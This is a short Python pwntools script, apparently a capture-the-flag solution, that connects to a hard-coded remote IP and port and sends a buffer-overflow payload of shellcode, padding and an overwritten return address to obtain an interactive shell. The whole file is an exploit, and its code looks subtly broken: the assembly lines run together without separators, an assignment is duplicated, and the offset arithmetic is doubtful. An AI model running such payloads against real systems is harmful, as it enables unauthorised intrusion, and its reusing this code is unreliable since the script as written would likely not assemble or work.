
from pwn import *
from pwn import p64


p = remote('120.53.107.60',9999)

p.sendline(b"0x30")
shellcode = shellcode = asm(
"mov ebp,esp" 
"push ebp"
"mov eax,0x233000"	
"mov [esp],eax"
"call system"
)
buf_addr = 0x233000
offset = 0x30 - 44 
payload = shellcode + b'A'*offset + b'junkjunk' + p64(buf_addr)
p.sendafter("OK,I will pass it on for you!", payload)
print(p.recvall())
p.interactive()
